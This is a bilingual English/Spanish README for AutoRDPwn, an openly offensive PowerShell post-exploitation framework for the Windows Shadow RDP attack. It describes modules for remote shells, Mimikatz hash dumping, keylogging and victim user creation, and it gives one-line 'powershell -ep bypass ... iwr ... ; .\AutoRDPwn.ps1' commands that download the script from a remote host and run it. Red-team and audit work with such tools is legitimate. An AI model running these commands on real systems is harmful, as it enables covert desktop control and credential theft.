<p align="center"><img width=450 alt="AutoRDPwn" src="https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.png"></p>

**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.

Thanks to the additional modules, it is possible to obtain a remote shell through Netcat, dump system hashes with Mimikatz, load a remote keylogger and much more. All this, Through a completely intuitive menu in seven different languages.

Additionally, it is possible to use it in a reverse shell through a series of parameters that are described in the usage section.


# Requirements
Powershell 4.0 or higher


# Changes
## Version 5.1
• Many bugs fixed

• Aesthetic improvements and improved waiting times

• Proxy-Aware connection through system settings

• It is now possible to use the offline tool by downloading the .zip file

• Language auto-detection by pressing the enter key

• Invoke-DCOM has been replaced by SharpRDP

• PowerUp has been replaced by Invoke-PrivescCheck

• Creation of the automatic cleaning subroutine in the victim

• New module available: SMB Shell encrypted with AES

• New module available: Change user with RunAs

*The rest of the changes can be consulted in the CHANGELOG file


# Use
This application can be used locally, remotely or to pivot between teams.

When used remotely in a reverse shell, it is necessary to use the following parameters:

| Parameter               | Description                                                                                    | 
| :---------------------- | :--------------------------------------------------------------------------------------------- | 
| **-admin / -noadmin**   | Depending on the permissions we have, we will use one or the other                             |
| **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
| **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
| **-option**             | As with the menu, we can choose how to launch the attack                                       |
| **-shadow**             | We will decide if we want to see or control the remote device                                  |
| **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |
| **-noclean**            | Disables the process of undoing all changes on the victim computer                             |

**Local execution on one line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
```

**Example of remote execution on a line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang English -option 4 -shadow control -createuser"
```


**The detailed guide of use can be found at the following link:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Screenshots
![AutoRDPwn1_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_en.PNG)
![AutoRDPwn2_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_en.PNG)


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This framework has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec

Some modules use third-party code, scripts, and tools, particularly:

• Chachi-Enumerator by **Luis Vacas** -> https://github.com/Hackplayers/PsCabesha-tools

• Invoke-Phant0m by **Halil Dalabasmaz** -> https://github.com/hlldz/Invoke-Phant0m

• Invoke-PowerShellTcp by **Nikhil "SamratAshok" Mittal** -> https://github.com/samratashok/nishang

• Invoke-TheHash by **Kevin Robertson** -> https://github.com/Kevin-Robertson/Invoke-TheHash

• Mimikatz by **Benjamin Delpy** -> https://github.com/gentilkiwi/mimikatz

• PsExec by **Mark Russinovich** -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• RDP Wrapper by **Stas'M Corp.** -> https://github.com/stascorp/rdpwrap

• SharpRDP by **Steven F** -> https://github.com/0xthirteen/SharpRDP

And many more, that do not fit here.. Thanks to all of them and their excellent work.


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can contact through info@darkbyte.net


-------------------------------------------------------------------------------------------------------------
# Spanish description


**AutoRDPwn** es un framework de post-explotación creado en Powershell, diseñado principalmente para automatizar el ataque **Shadow** en equipos Microsoft Windows. Esta vulnerabilidad (catalogada como característica por Microsoft) permite a un atacante remoto visualizar el escritorio de su víctima sin su consentimiento, e incluso controlarlo a petición, utilizando herramientas nativas del propio sistema operativo.

Gracias a los módulos adicionales, es posible obtener una shell remota a través de Netcat, volcar los hashes del sistema con Mimikatz, cargar un keylogger remoto y mucho más. Todo ello, A través de un menú totalmente intiutivo en siete idiomas diferentes.

Adicionalmente, es posible utilizarlo en una shell inversa a través de una serie de parámetros que se descibren en la sección de uso.


# Requisitos
Powershell 4.0 o superior


# Cambios

## Versión 5.1
• Muchos errores corregidos

• Mejoras estéticas y tiempos de espera mejorados

• Conexión Proxy-Aware a través de la configuración del sistema

• Ahora es posible utilizar la herramienta offline descargando el fichero .zip

• Autodetección de idioma pulsando la tecla enter

• Invoke-DCOM ha sido sustituido por SharpRDP

• PowerUp ha sido sustituido por Invoke-PrivescCheck

• Creación de la subrutina de limpieza automática en la víctima

• Nuevo módulo disponble: SMB Shell cifrada con AES

• Nuevo módulo disponible: Cambiar de usuario con RunAs

*El resto de cambios se pueden consultar en el fichero CHANGELOG


# Uso
Esta aplicación puede usarse de forma local, remota o para pivotar entre equipos.

Al utilizarse de forma remota en una shell inversa, es necesario utilizar los siguientes parámetros:

| Parámetro               | Descripción                                                                                  | 
| :---------------------- | :------------------------------------------------------------------------------------------- | 
| **-admin / -noadmin**   | Dependiendo de los permisos de los que dispongamos, utilizaremos una u otra                  |
| **-nogui**              | Esto evitará cargar el menú y algunos colores, garantizado su funcionalidad                  | 
| **-lang**               | Elegiremos nuestro idioma (English, Spanish, French, German, Italian, Russian o Portuguese)  |
| **-option**             | Al igual que con el menú, podremos elegir de que forma lanzar el ataque                      |
| **-shadow**             | Decidiremos si queremos ver o controlar el equipo remoto                                     |
| **-createuser**         | Este parámetro es opcional, creará el usuario AutoRDPwn:AutoRDPwn en el equipo víctima       |
| **-noclean**            | Deshabilita el proceso de deshacer todos los cambios en el equipo víctima                    |

**Ejecución local en una línea:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
```

**Ejemplo de ejecución remota en una línea:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang Spanish -option 4 -shadow control -createuser"
```


**La guía detallada de uso se encuentra en el siguiente enlace:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Capturas de pantalla
![AutoRDPwn1_es](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_es.PNG)
![AutoRDPwn2_es](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_es.PNG)


# Licencia
Este proyecto está licenciando bajo la licencia GNU 3.0 - ver el fichero LICENSE para más detalles.


# Créditos y Agradecimientos
Este framework ha sido creado y diseñado desde cero por Joel Gámez Molina // @JoelGMSec

Algunos módulos utilizan código, scripts y herramientas de terceros, particularmente:

• Chachi-Enumerator de **Luis Vacas** -> https://github.com/Hackplayers/PsCabesha-tools

• Invoke-Phant0m de **Halil Dalabasmaz** -> https://github.com/hlldz/Invoke-Phant0m

• Invoke-PowerShellTcp de **Nikhil "SamratAshok" Mittal** -> https://github.com/samratashok/nishang

• Invoke-TheHash de **Kevin Robertson** -> https://github.com/Kevin-Robertson/Invoke-TheHash

• Mimikatz dey **Benjamin Delpy** -> https://github.com/gentilkiwi/mimikatz

• PsExec de **Mark Russinovich** -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• RDP Wrapper de **Stas'M Corp.** -> https://github.com/stascorp/rdpwrap

• SharpRDP de **Steven F** -> https://github.com/0xthirteen/SharpRDP

Y muchos más, que no caben aquí.. Gracias a todos ellos y su excelente trabajo.


# Contacto
Este software no ofrece ningún tipo de garantía. Su uso es exclusivo para entornos educativos y/o auditorías de seguridad con el correspondiente consentimiento del cliente. No me hago responsable de su mal uso ni de los posibles daños causados por el mismo.

Para más información, puede contactar a través de info@darkbyte.net
